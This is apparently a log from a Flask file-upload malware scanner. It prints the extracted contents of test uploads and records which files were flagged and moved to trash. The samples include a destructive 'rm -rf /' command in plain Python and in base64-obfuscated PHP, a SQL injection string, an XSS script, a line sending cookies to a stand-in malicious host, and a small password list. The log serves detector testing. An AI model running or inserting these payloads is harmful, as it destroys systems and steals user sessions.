2025-02-22 20:23:00,663 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:23:00,665 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:23:00,666 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,675 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:23:00,675 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 20:23:00,675 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 20:23:00,677 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,682 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,691 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:23:00,691 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,692 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,693 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:23:00,693 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/1.sql
2025-02-22 20:23:00,693 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:23:00,694 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,695 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,696 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:23:00,698 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,699 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,700 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:23:00,702 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:23:00,703 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:23:00,704 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:23:00,706 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,707 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,713 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,725 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:23:00,725 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,727 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,728 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,729 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,730 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:23:00,732 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,733 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,741 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,753 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:23:00,753 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,754 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:23:00,756 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:23:00,757 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:23:00,758 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:23:00,759 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,760 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,766 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,774 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:23:00,774 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,775 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,777 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,779 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:23:00,780 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,781 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,792 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,807 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:23:00,807 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,808 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:23:00,810 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:23:00,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:23:00,812 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:23:00,813 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,814 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,827 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:23:00,827 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,829 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,830 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,831 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,832 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:23:00,834 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,835 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:23:00,840 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,849 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:23:00,849 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,850 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,851 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,853 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,854 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,855 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,856 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:23:00,857 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,866 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,879 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:23:00,879 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,881 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:23:00,882 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,884 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,885 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,887 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,888 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,890 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,891 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:23:00,893 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,902 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:23:00,912 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:23:00,912 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,914 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:23:00,915 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,917 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:23:00,918 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:23:00,919 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:23:00,920 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:23:00,922 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:23:00,923 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:23:00,924 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:23:00,930 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
